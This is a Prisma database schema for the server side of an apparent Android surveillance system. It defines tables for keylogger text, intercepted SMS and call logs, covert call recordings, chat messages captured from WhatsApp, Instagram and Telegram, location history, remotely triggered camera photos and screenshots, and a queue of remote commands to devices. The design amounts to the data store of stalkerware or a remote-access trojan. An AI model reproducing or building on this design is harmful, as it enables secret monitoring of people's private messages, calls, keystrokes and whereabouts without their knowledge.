generator client {
  provider = "prisma-client-js"
  binaryTargets = ["native", "debian-openssl-1.1.x", "rhel-openssl-1.0.x", "linux-musl-openssl-3.0.x"]
}

datasource db {
  provider = "mysql"
  url      = env("DATABASE_URL")
}

// Device model - represents a registered Android device
model Device {
  id             String   @id @default(uuid())
  deviceId       String   @unique // Internal app UUID
  androidId      String?  @unique // Physical device Android ID
  fcmToken       String?  // Firebase Cloud Messaging token
  model          String?  // Device model (e.g., "Samsung Galaxy S21")
  manufacturer   String?
  androidVersion String?
  appVersion     String?
  isOnline       Boolean  @default(false)
  lastSeen       DateTime @default(now())
  battery        Int      @default(100)
  isCharging     Boolean  @default(false)
  network        String?  // "WiFi", "Cellular", or "Offline"
  createdAt      DateTime @default(now())
  updatedAt      DateTime @updatedAt

  // Relations
  smsLogs        SmsLog[]
  callLogs       CallLog[]
  contacts       Contact[]
  locations      Location[]
  keylogs        Keylog[]
  apps           AppInfo[]
  notifications  NotificationLog[]
  screenshots    Screenshot[]
  photos         Photo[]
  commands       Command[]
  callRecordings CallRecording[]
  chatMessages   ChatMessage[]
}

// SMS messages
model SmsLog {
  id        String   @id @default(uuid())
  deviceId  String
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  address   String   // Phone number
  body      String   @db.Text // SMS can be long, use TEXT type
  type      String   // "incoming" or "outgoing"
  externalId String?  // ID from the device provider
  timestamp  DateTime
  syncedAt   DateTime @default(now())

  @@unique([deviceId, externalId])
  @@index([deviceId, timestamp])
}

// Call logs
model CallLog {
  id        String   @id @default(uuid())
  deviceId  String
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  number    String
  name      String?  // Contact name if available
  type      String   // "incoming", "outgoing", "missed"
  duration  Int      // Duration in seconds
  externalId String?  // ID from the device provider
  timestamp  DateTime
  syncedAt   DateTime @default(now())

  @@unique([deviceId, externalId])
  @@index([deviceId, timestamp])
}

// Contacts
model Contact {
  id       String  @id @default(uuid())
  deviceId String
  device   Device  @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  name     String
  phone    String?
  email    String?
  syncedAt DateTime @default(now())

  @@index([deviceId])
}

// Location history
model Location {
  id        String   @id @default(uuid())
  deviceId  String
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  latitude  Float
  longitude Float
  accuracy  Float?
  altitude  Float?
  speed     Float?
  timestamp DateTime
  syncedAt  DateTime @default(now())

  @@index([deviceId, timestamp])
}

// Keylogger data
model Keylog {
  id        String   @id @default(uuid())
  deviceId  String
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  app       String?  // App package where text was typed
  appName   String?  // Friendly app name
  text      String   @db.Text // Keylog text can be very long
  timestamp DateTime
  syncedAt  DateTime @default(now())

  @@index([deviceId, timestamp])
}

// Installed applications
model AppInfo {
  id          String   @id @default(uuid())
  deviceId    String
  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  name        String
  packageName String
  versionName String?
  installDate DateTime?
  isSystem    Boolean  @default(false)
  syncedAt    DateTime @default(now())

  @@unique([deviceId, packageName])
  @@index([deviceId])
}

// Notification logs
model NotificationLog {
  id        String   @id @default(uuid())
  deviceId  String
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  app       String   // Package name
  appName   String?  // Friendly name
  title     String?  @db.Text // Title can be long
  text      String?  @db.Text // Notification text can be very long
  timestamp DateTime
  syncedAt  DateTime @default(now())

  @@index([deviceId, timestamp])
}

// Screenshots
model Screenshot {
  id        String   @id @default(uuid())
  deviceId  String
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  data      String?  @db.LongText // Base64 encoded image data
  filePath  String?  // Legacy: Path to stored file (optional now)
  fileName  String?
  fileSize  Int?
  mimeType  String?  @default("image/jpeg")
  timestamp DateTime @default(now())

  @@index([deviceId, timestamp])
}

// Photos captured remotely
model Photo {
  id        String   @id @default(uuid())
  deviceId  String
  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  data      String?  @db.LongText // Base64 encoded image data
  filePath  String?  // Legacy: Path to stored file (optional now)
  fileName  String?
  fileSize  Int?
  mimeType  String?  @default("image/jpeg")
  camera    String   // "front" or "back"
  timestamp DateTime @default(now())

  @@index([deviceId, timestamp])
}

// Commands sent to devices
model Command {
  id         String   @id @default(uuid())
  deviceId   String
  device     Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  type       String   // Command type (e.g., "capture_screenshot")
  payload    String?  // JSON payload
  status     String   @default("pending") // "pending", "sent", "completed", "failed"
  result     String?  // Result or error message
  createdAt  DateTime @default(now())
  executedAt DateTime?

  @@index([deviceId, status])
}

// Call recordings
model CallRecording {
  id           String   @id @default(uuid())
  deviceId     String
  device       Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  phoneNumber  String?
  callType     String   // "incoming" or "outgoing"
  duration     Int      // seconds
  status       String   @default("uploaded") // "recording", "pending", "uploaded", "error"
  audioData    String?  @db.LongText // Base64 encoded audio - MUST be LongText for large files
  fileName     String?  // Original filename
  mimeType     String?  @default("audio/mpeg")
  fileUrl      String?  @db.Text // URL can be long (data URI)
  filePath     String?  // Server storage path
  fileSize     Int?     // bytes
  recordedAt   DateTime @default(now())
  uploadedAt   DateTime @default(now())

  @@index([deviceId, recordedAt])
}

// Device logs - for debugging and monitoring
model DeviceLog {
  id        String   @id @default(uuid())
  deviceId  String   // Device ID (string, not FK to avoid issues)
  level     String   // DEBUG, INFO, WARN, ERROR
  tag       String   // Log tag (e.g., "SocketManager", "WebRTCManager")
  message   String   @db.Text // Log message
  timestamp DateTime
  createdAt DateTime @default(now())

  @@index([deviceId, timestamp])
  @@index([level])
}

// Chat messages captured from messaging apps
model ChatMessage {
  id          String   @id @default(uuid())
  deviceId    String
  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
  chatApp     String   // "whatsapp", "instagram", "telegram", etc.
  contactName String?  // Contact or group name
  messageText String   @db.Text // Message content can be long
  isSent      Boolean  // true = sent by user, false = received
  isRaw       Boolean  @default(false) // true = couldn't determine sent/recv
  timestamp   DateTime // When message was captured on device
  messageHash String?  // MD5 hash for deduplication (app+contact+text+time)
  syncedAt    DateTime @default(now())

  @@unique([deviceId, messageHash])
  @@index([deviceId, timestamp])
  @@index([deviceId, chatApp])
}
